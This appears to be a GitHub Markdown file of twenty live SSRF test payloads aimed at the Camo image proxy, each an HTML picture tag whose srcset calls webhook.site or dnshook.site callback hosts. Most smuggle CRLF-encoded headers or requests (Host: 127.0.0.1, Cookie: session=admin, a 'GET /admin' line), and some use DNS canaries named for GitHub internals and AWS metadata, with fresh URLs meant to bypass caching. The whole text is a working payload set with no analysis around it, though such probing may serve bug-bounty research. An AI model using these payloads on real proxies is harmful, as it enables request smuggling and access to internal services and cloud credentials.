# SSRF v6 - Fresh URLs to Bypass Camo Cache

## Test A1: Basic Tracker
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/fresh-tracker-abc123" media="(min-width: 1px)"><img src="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/img-abc123"></picture>

## Test A2: CRLF Host Injection
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/host-inject-xyz789%0d%0aHost:%20127.0.0.1" media="(min-width: 1px)"><img src="x"></picture>

## Test A3: X-Forwarded-For CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/xff-inject-aaa111%0d%0aX-Forwarded-For:%20127.0.0.1" media="(min-width: 1px)"><img src="x"></picture>

## Test A4: Double CRLF Body
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/body-inject-bbb222%0d%0a%0d%0aGET%20/admin%20HTTP/1.1" media="(min-width: 1px)"><img src="x"></picture>

## Test A5: Connection Header
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/conn-inject-ccc333%0d%0aConnection:%20upgrade" media="(min-width: 1px)"><img src="x"></picture>

## Test A6: Transfer-Encoding CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/te-inject-ddd444%0d%0aTransfer-Encoding:%20chunked" media="(min-width: 1px)"><img src="x"></picture>

## Test A7: DNS Canary v6
<picture><source srcset="https://v6-callback-eee555.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/test" media="(min-width: 1px)"><img src="x"></picture>

## Test A8: GitHub Internal DNS v6  
<picture><source srcset="https://github-internal-v6-fff666.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test A9: AWS Metadata via DNS
<picture><source srcset="https://aws-meta-v6-ggg777.b45a05ce-3f7d-4a49-9e5d-5a138dde5eca.dnshook.site/" media="(min-width: 1px)"><img src="x"></picture>

## Test A10: X-Original-URL CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/xorig-inject-hhh888%0d%0aX-Original-URL:%20/admin" media="(min-width: 1px)"><img src="x"></picture>

## Test A11: Cookie CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/cookie-inject-iii999%0d%0aCookie:%20session=admin" media="(min-width: 1px)"><img src="x"></picture>

## Test A12: Authorization CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/auth-inject-jjj000%0d%0aAuthorization:%20Bearer%20test-token" media="(min-width: 1px)"><img src="x"></picture>

## Test A13: Content-Type CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/ct-inject-kkk111%0d%0aContent-Type:%20text/html" media="(min-width: 1px)"><img src="x"></picture>

## Test A14: Accept CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/accept-inject-lll222%0d%0aAccept:%20*/*" media="(min-width: 1px)"><img src="x"></picture>

## Test A15: Content-Length Zero
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/cl-zero-mmm333%0d%0aContent-Length:%200" media="(min-width: 1px)"><img src="x"></picture>

## Test A16: Newline Only (LF)
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/lf-only-nnn444%0aHost:%20internal" media="(min-width: 1px)"><img src="x"></picture>

## Test A17: Carriage Return Only (CR)
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/cr-only-ooo555%0dHost:%20internal" media="(min-width: 1px)"><img src="x"></picture>

## Test A18: Space Before CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/space-crlf-ppp666%20%0d%0aEvil:%20header" media="(min-width: 1px)"><img src="x"></picture>

## Test A19: Tab Before CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/tab-crlf-qqq777%09%0d%0aEvil:%20header" media="(min-width: 1px)"><img src="x"></picture>

## Test A20: Multiple CRLF
<picture><source srcset="https://webhook.site/b45a05ce-3f7d-4a49-9e5d-5a138dde5eca/v6/multi-crlf-rrr888%0d%0a%0d%0a%0d%0aBody" media="(min-width: 1px)"><img src="x"></picture>

---
**v6: Fresh URLs with unique identifiers to bypass Camo caching**
